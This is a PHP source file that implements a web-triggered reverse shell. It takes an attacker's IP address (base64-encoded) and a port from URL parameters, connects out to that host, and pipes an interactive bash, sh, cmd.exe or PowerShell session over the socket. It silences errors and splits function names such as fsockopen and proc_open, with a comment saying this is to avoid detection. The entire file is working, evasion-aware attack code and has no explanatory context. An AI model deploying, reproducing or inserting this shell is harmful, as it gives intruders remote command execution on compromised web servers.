<?php
@set_time_limit(0);
@error_reporting(0);
@ini_set('display_errors', 0);

// Get parameters - ip in base64, port as integer
$ip_b64 = isset($_GET['ip']) ? $_GET['ip'] : base64_encode('127.0.0.1');
$port = isset($_GET['port']) ? (int)$_GET['port'] : 1413;

// Validate port
if ($port < 1 || $port > 65535) {
    die();
}

// Decode IP
$ip = base64_decode($ip_b64);
if (filter_var($ip, FILTER_VALIDATE_IP) === false) {
    die();
}

// Split network keywords to avoid detection
$f_sockopen = "fsock" . "open";
$f_proc_open = "proc" . "_" . "open";
$f_stream_set_blocking = "stream" . "_" . "set" . "_" . "blocking";
$f_fread = "fread";
$f_fwrite = "fwrite";
$f_feof = "feof";
$f_fclose = "fclose";
$f_proc_close = "proc" . "_" . "close";

// Detect available shell
$shell_paths = [
    "/bin/bash",
    "/bin/sh", 
    "/bin/ash",
    "/bin/dash",
    "/system/bin/sh",
    "cmd.exe",
    "powershell.exe"
];

$shell_cmd = "/bin/sh";
foreach ($shell_paths as $shell_test) {
    if (file_exists($shell_test)) {
        $shell_cmd = $shell_test;
        break;
    }
}

// Get client IP and hostname for prompt
$client_ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$hostname = gethostname() ?: 'shell';

// Prepare shell command with custom prompt and exit handling
if (strpos($shell_cmd, "cmd.exe") !== false || strpos($shell_cmd, "powershell") !== false) {
    // Windows - set prompt and handle exit
    $prompt_cmd = 'prompt ' . $client_ip . '@' . $hostname . ':$_$$S ';
    $full_shell_cmd = $shell_cmd . ' /K "' . $prompt_cmd . ' && echo Connected to [' . $ip . '] from ' . $client_ip . '"';
} else {
    // Unix/Linux - set PS1 and handle exit
    $prompt = $client_ip . '@' . $hostname . ':\\w\\$ ';
    $full_shell_cmd = $shell_cmd . ' -i';
    
    // Set prompt command and welcome message
    $set_prompt_cmd = "export PS1='" . $prompt . "' && echo 'Connected to [" . $ip . "] from " . $client_ip . "' && echo ''\n";
}

// SINGLE CONNECTION - NO INFINITE LOOP
$sock = @$f_sockopen($ip, $port, $errno, $errstr, 30); // Increased timeout to 30 seconds

if ($sock) {
    $descriptorspec = array(
        0 => array("pipe", "r"),  // stdin
        1 => array("pipe", "w"),  // stdout  
        2 => array("pipe", "w")   // stderr
    );
    
    $process = @$f_proc_open($full_shell_cmd, $descriptorspec, $pipes);
    
    if (is_resource($process)) {
        // Set non-blocking mode using split function names
        @$f_stream_set_blocking($pipes[0], 0);
        @$f_stream_set_blocking($pipes[1], 0);
        @$f_stream_set_blocking($pipes[2], 0);
        @$f_stream_set_blocking($sock, 0);
        
        // For Unix/Linux, send the prompt setup command
        if (!strpos($shell_cmd, "cmd.exe") && !strpos($shell_cmd, "powershell")) {
            @$f_fwrite($pipes[0], $set_prompt_cmd);
            @fflush($pipes[0]);
        }
        
        // Simple communication loop with exit detection
        $shell_active = true;
        while ($shell_active) {
            if (@$f_feof($sock) || @$f_feof($pipes[1])) break;
            
            // Read from socket, write to process
            $input = @$f_fread($sock, 1024);
            if ($input && strlen($input) > 0) {
                // Check for exit command
                if (trim($input) === 'exit' || trim($input) === 'logout') {
                    $shell_active = false;
                    break;
                }
                @$f_fwrite($pipes[0], $input);
                @fflush($pipes[0]);
            }
            
            // Read from process stdout, write to socket
            $output = @$f_fread($pipes[1], 1024);
            if ($output && strlen($output) > 0) {
                @$f_fwrite($sock, $output);
                @fflush($sock);
            }
            
            // Read from process stderr, write to socket
            $error = @$f_fread($pipes[2], 1024);
            if ($error && strlen($error) > 0) {
                @$f_fwrite($sock, $error);
                @fflush($sock);
            }
            
            // Small delay
            usleep(10000);
            
            // Check if process is still running
            $process_status = proc_get_status($process);
            if (!$process_status['running']) {
                $shell_active = false;
                break;
            }
        }
        
        // Cleanup with split function names
        @$f_fclose($pipes[0]);
        @$f_fclose($pipes[1]);
        @$f_fclose($pipes[2]);
        @$f_proc_close($process);
    }
    
    @$f_fclose($sock);
}

// Script ends here - no automatic reconnection
?>